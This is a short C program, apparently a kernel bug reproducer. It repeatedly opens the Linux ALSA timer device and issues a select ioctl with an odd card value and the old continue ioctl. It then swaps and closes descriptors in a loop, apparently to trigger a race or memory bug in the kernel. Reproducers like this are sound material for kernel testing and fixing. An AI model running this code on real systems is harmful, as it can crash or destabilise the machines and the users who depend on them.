#include <err.h>
#include <fcntl.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/stat.h>

#include <sound/asound.h>

static void thr()
{
	static const struct snd_timer_select sts = {
		.id.dev_class = SNDRV_TIMER_CLASS_GLOBAL,
		.id.dev_sclass = 0x5,
		.id.card = 0xffffff00,
	};
	int fd1, fd2;

	fd1 = open("/dev/snd/timer", O_RDONLY);
	if (fd1 < 0)
		err(1, "open1");

	if (ioctl(fd1, SNDRV_TIMER_IOCTL_SELECT, &sts) < 0)
		err(1, "ioctl(SNDRV_TIMER_IOCTL_SELECT)");

	if (ioctl(fd1, _IO('T', 0x22), 0) < 0)
		err(1, "ioctl(SNDRV_TIMER_IOCTL_CONTINUE_OLD)");

	fd2 = open("/dev/snd/timer", O_RDONLY);
	if (fd2 < 0)
		err(1, "open2");

	dup2(fd2, fd1);

	usleep(10000);
	close(fd2);
	close(fd1);
	usleep(10000);
}

int main()
{
	while (1)
		thr();

	return 0;
}

